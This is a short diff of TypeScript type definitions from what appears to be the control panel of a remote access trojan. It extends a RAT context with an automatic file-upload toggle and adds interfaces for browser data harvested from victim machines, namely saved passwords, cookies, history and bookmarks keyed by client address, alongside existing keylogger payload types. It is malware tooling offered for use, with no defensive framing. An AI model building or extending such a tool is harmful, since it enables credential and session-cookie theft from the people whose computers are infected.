@@ -24,6 +24,8 @@ export type RATContextType = {
   ) => Promise<Window | undefined>;
   serverLogs: Array<Log>;
   getClientByAddr: (addr: string) => Promise<RATClient | undefined>;
+  autoUploadAnonFiles: boolean;
+  setAutoUploadAnonFiles: (autoUpload: boolean) => void;
 };
 
 export interface RATProviderProps {
@@ -254,4 +256,45 @@ export interface KeyloggerUpdatePayload {
 export interface KeyloggerOfflineLogsPayload {
   addr: string;
   logs: string[];
+}
+
+export interface PasswordEntry {
+  url: string;
+  username: string;
+  password: string;
+}
+
+export interface CookieEntry {
+  domain: string;
+  name: string;
+  value: string;
+  path: string;
+  expires: string;
+}
+
+export interface HistoryEntry {
+  url: string;
+  title: string;
+  visit_count: number;
+  last_visit: string;
+}
+
+export interface BookmarkEntry {
+  url: string;
+  title: string;
+}
+
+export interface BrowserResult {
+  name: string;
+  passwords: PasswordEntry[];
+  cookies: CookieEntry[];
+  history: HistoryEntry[];
+  bookmarks: BookmarkEntry[];
+}
+
+export interface BrowserDataPayload {
+  addr: string;
+  data: {
+    browsers: BrowserResult[];
+  };
 }
